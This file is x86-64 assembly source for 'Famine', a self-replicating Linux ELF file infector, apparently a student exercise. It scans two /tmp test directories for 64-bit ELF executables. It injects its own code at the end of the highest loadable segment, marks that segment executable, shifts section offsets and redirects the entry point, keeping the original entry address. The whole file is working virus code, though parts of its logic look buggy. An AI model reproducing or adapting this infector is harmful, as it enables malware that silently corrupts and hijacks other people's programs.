	[BITS 64]

	%define SYS_WRITE		1
	%define SYS_OPEN		2
	%define SYS_CLOSE		3
	%define SYS_LSEEK		8
	%define SYS_MMAP		9
	%define SYS_MUNMAP		11
	%define SYS_EXIT		60
	%define SYS_CHDIR		79
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text
	famine64_size dd famine64_end - famine64_func

famine64_func:
	push 	rdi
	push 	rsi
	push 	rdx
	push 	rax
	push 	rbx
	sub		rsp, 8

	lea 	rdi, [rel dir_one]
	call 	find_files
	jmp		end
	lea 	rdi, [rel dir_two]
	call 	find_files
	jmp		end

;; void find_files(char *dir_path)
find_files:
	push 	rbp
	push	rbx
	sub		rsp, 1044			; char *dir_path, int fd   , int ret   , char buff[1024]
								; [rsp]         , [rsp + 8], [rsp + 12], [rsp + 16]

	xor		eax, eax
	mov		QWORD [rsp], rdi
	;; int	sys_open(rdi, 0, 0) 			-> ret: [rsp + 8] directory fd.
	mov		rdx, 0
	mov 	rsi, 0
	mov		rdi, QWORD [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0
	jl	 	find_files_end
	mov		DWORD [rsp + 8], eax
loop_file:
	xor		eax, eax
	;; int	sys_getdents(fd, *dirp, count)	-> ret: [rsp + 12]
	mov 	edi, DWORD [rsp + 8]
	lea 	rsi, [rsp + 16]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	test	eax, eax
	jle		loop_end
	mov		DWORD [rsp + 12], eax 				; store return value of getdents64
	xor		ebx, ebx							; initialize off to 0
	jmp		check_file_type
next_file:
	movsx	eax, BYTE [rsp + rbp + 32] 			; 32 = rsp + 16 + 16 (offset of *dirp->d_reclen)
	add		ebx, eax
	cmp		DWORD [rsp + 12], ebx
	jle		loop_file
check_file_type:	
	movsx	rbp, ebx
	cmp		BYTE [rsp + rbp + 34], 8 			; 34 = rsp + 16 + 18 (the offset of *dirp->d_type) + rbp (offset of each *dirp)
	jne		next_file
	mov		rdi, QWORD [rsp]
	lea		rsi, [rsp + rbp + 35] 				; 35 = rsp + 16 + 19 (offset of *dirp->d_name)
	call	get_dat_elf
	jmp		next_file
loop_end:
	mov		edi, DWORD [rsp + 8]
	mov		rax, SYS_CLOSE
	syscall
find_files_end:	
	add		rsp, 1044
	pop		rbx
	pop		rbp
	ret

;; void		get_dat_elf(char *dir, char *file)
get_dat_elf:
	push	rbp
	push	rbx
	push	r15
	push	r14
	sub		rsp, 1024			; char[1024], int fd
								; [rsp]     , [rsp + 8]

	xor		ecx, ecx			; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl
	je		next_copy
copy_dir:
	mov		BYTE [rsp + rcx], dl
	inc		rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne		copy_dir
next_copy:
	add		rsp, rcx
	xor		eax, eax			; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je		open_file
copy_file:	
	mov		BYTE [rsp + rax], dl
	inc		rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne		copy_file
open_file:
	mov		BYTE [rsp + rax], 0
	sub		rsp, rcx
	sub		rsp, 8				; to store the return value of mmap
	;; int	sys_open(fd, 0, 0) 	-> ret: [rsp + 1024] directory fd.
	xor		edx, edx
	xor		esi, esi
	lea		rdi, [rsp + 8]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0
	jl	 	get_dat_elf_end
	mov		r14, rax
	;; int	sys_lseek(fd, 1, LSEEK_END)
	mov		edi, eax
	mov		esi, 1
	mov		edx, 2				; LSEEK_END
	mov		rax, SYS_LSEEK
	syscall
	cmp		rax, 0
	jle		open_file_end
	mov		r15, rax
	;; void	*mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
	xor		r9, r9				; 0
	mov		r8, r14				; fd
	mov		r10d, 2				; MAP_PRIVATE
	mov		edx, 3				; PROT_READ | PROT_WRITE
	mov		rsi, rax			; size
	xor		edi, edi			; NULL
	mov		rax, SYS_MMAP
	syscall
	cmp		rax, 0
	jl		open_file_end
	mov		QWORD [rsp], rax

	mov		rdx, rax			; void *data
	mov		rsi, r15			; int size
	mov		rdi, r14			; int fd
	call	pack_file

	mov		rsi, r15
	mov		rdi, [rsp]
	mov		rax, SYS_MUNMAP
	syscall
open_file_end:	
	mov		rdi, r14
	mov		rax, SYS_CLOSE
	syscall
get_dat_elf_end:
	add		rsp, 8
	add		rsp, 1024
	pop		r14
	pop		r15
	pop		rbx
	pop		rbp
	ret

;; void	pack_file(int fd, int size, char *data)
pack_file:
	cmp		BYTE [rdx], 0x7f
	jne		pack_file_end
	cmp		BYTE [rdx + 1], 'E'
	jne		pack_file_end
	cmp		BYTE [rdx + 2], 'L'
	jne		pack_file_end
	cmp		BYTE [rdx + 3], 'F'
	jne		pack_file_end
	cmp		BYTE [rdx + 4], 2			; ->e_ident[EI_CLASS] == ELFCLASS64
	jne		pack_file_end
	cmp		BYTE [rdx + 5], 0			; ->e_ident[EI_DATA] != ELFDATANONE
	je		pack_file_end
	cmp		BYTE [rdx + 6], 1			; ->e_ident[EI_VERSION] == EV_CURRENT
	jne		pack_file_end
	movzx	eax, BYTE [rdx + 16] 		; ->e_type == ET_EXEC || ->e_type == ET_DYN
	sub		eax, 2
	cmp		al, 1
	ja		pack_file_end

	movzx	ecx, WORD [rdx + 56] 		; ->e_phnum (size: 2)
	mov		r8, QWORD [rdx + 32] 		; ->e_phoff (size: 8)
	lea		rax, [rdx + r8]				; pointer to first segment of Program Header table
	imul	rcx, rcx, 56				; total size of Program Header table (56: sizeof Elf64_Phdr)
	add		rcx, r8		  				; offset to the end of Program Header table
	add		rcx, rdx					; address of the end of Program Header table
	xor		r8d, r8d
	jmp		find_highest_pt
next_program:
	add		rax, 56						; move to next Program Header
	cmp		rcx, rax					; did we passed the last Program Header segment offset ?
	je		change_section_offset
find_highest_pt:	
	;; 1. Find the highest memory mapped PT_LOAD segment
	cmp		DWORD [rax], 1				; is the segment loadable ?
	jne		next_program
	test	r8, r8						; test if r8 is 0 (NULL)
	je		first_segment
	mov		r9, QWORD [r8 + 16] 		; ->p_vaddr (size: 8) offset
	cmp		QWORD [rax + 16], r9		; is segment[i].p_vaddr > assumed->p_vaddr ?
	cmova	r8, rax						; Move if above (unsigned)
	jmp		next_program
first_segment:
	mov		r8, rax						; assign r8 to be the highest loadable segment
	jmp		next_program
change_section_offset:
	test	r8, r8						; if no loadable segment has been found, return
	je		pack_file_end
	movzx	ecx, WORD [rdx + 60] 		; ->e_shnum (size: 2)
	mov 	r9, QWORD [rdx + 40]		; ->e_shoff (size: 8)
	lea		rax, [rdx + r9]				; pointer to first segment of Section Header table
	imul	rcx, rcx, 64				; total size of Section Header table (64: sizeof Elf64_Shdr)
	add		rcx, r9						; offset to the end of Section Header table
	add		rcx, rdx					; address of the end of Section Header table
	mov		r9, QWORD [r8 + 8]			; store the infected segment offset (+8: offset of p_offset)
	add		r9, QWORD [r8 + 40]			; add to it te infected segment memory size (+40: offset of p_memsz)
find_higher_sections:
	;; Extra: Change the offset of sections higher than the section we will infect.
	mov		r10, QWORD [rax + 24] 		; store section[i].s_offset
	cmp		r10, r9 					; compare if it is greater than then infected segment offset
	jl		next_section
	add		r10d, [rel famine64_size] 	; add to it our program size
	mov		QWORD [rax + 24], r10		; rewrite it to section
	jmp		next_section
next_section:
	add		rax, 64						; move to next section
	cmp		rcx, rax					; check if we are at the end of it
	jl		find_higher_sections

	;; Now we will change the program entry point
	;; From now on, r8 contains our code segment, rcx the Elf Header
	mov		rax, QWORD [rdx + 24] 		; First, store the original program entry point
	mov		r9, QWORD [r8 + 16]			; store infected segment virtual address (16: p_vaddr offset)
	add		r9, QWORD [r8 + 32]			; add it the segment memory size so the new value point to our infected code
	mov		QWORD [rdx + 24], r9		; modify the program entry point to our infected segment virtual address
	mov		r10d, [rel famine64_size]
	add		QWORD [rdx + 40], r10		; modify the Section Header table offset
	mov		ecx, DWORD [r8 + 4]			; store infected segment memory size (+4: p_memsz)
	test	cl, 1						; see if it got the EXECUTABEL bit
	jne		pack_finish
	or		ecx, 1						; make the segment executable
	mov		DWORD [r8 + 4], ecx
pack_finish:	
	add		QWORD [r8 + 40], r10 		; change segment memory size
	mov		r10, QWORD [r8 + 40]
	mov		QWORD [r8 + 32], r10 		; change segment file size

	sub		rsp, 40
	mov		QWORD [rsp], rdi		; store the program file descriptor
	mov		QWORD [rsp + 8], rdx	; store the address of the program data
	mov		QWORD [rsp + 16], rsi 	; store the program size
	mov		QWORD [rsp + 24], rax	; store the original program entry point
	mov		rax, QWORD [r8 + 8]		;
	add		rax, QWORD [rsp + 40]	; (infected->p_offset + infected->p_filesz - famine64_size)
	sub		eax, [rel famine64_size] ;
	mov		QWORD [rsp + 32], rax 	; store the offset to our code injection
	;; Now we will write our new program
	mov		rsi, QWORD [rsp + 8]					; replace rsi with *data (for write)
	mov		rdx, QWORD [rsp + 32]
	mov		rax, SYS_WRITE
	;; rdi already contain the fd, rsi contains a pointer to the first byte of the program data and rcx the offset
	syscall
	mov		rdi, QWORD [rsp]
	lea		rsi, [rel famine64_func] 	; write family64_func
	mov		rdx, [rel famine64_size]	; compute his size
	sub		rdx, 8						; less the value of Elf64_Addr
	mov		rax, SYS_WRITE
	syscall
	mov		rdi, QWORD [rsp]
	lea		rsi, [rsp + 24]				; load the address of the old program entry point, stored in r11
	mov		rdx, 8						; sizeof ELF64_Addr
	mov 	rax, SYS_WRITE
	syscall
	mov		rdi, QWORD [rsp]
	lea		rsi, [rsp + 8]
	add		rsi, QWORD [rsp + 32]
	mov		rdx, QWORD [rsp + 16]
	sub		rdx, QWORD [rsp + 32]
	mov		rax, SYS_WRITE
	syscall

	add		rsp, 40
pack_file_end:
	ret

end:	
	pop 	rbx
	pop 	rax
	pop 	rdx
	pop 	rsi
	pop 	rdi
	add		rsp, 8

	mov 	rax, SYS_EXIT
	syscall
	push 	QWORD [rel jump_vaddr]
	ret

ret_ok:
	push rax
	push rdi
	push rsi
	push rdx
	mov 	rax, 1
	mov 	rdi, 1
	mov 	rsi, OK
	mov 	rdx, 3
	syscall
	pop rdx
	pop rsi
	pop rdi
	pop rax
	ret

ret_error:
	mov 	rax, 1
	mov 	rdi, 1
	mov 	rsi, ERR
	mov 	rdx, 6
	syscall
	ret

famine64_data:
	OK db "OK", 10
	ERR db "ERROR", 10
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	jump_vaddr dq 0x0

famine64_end:
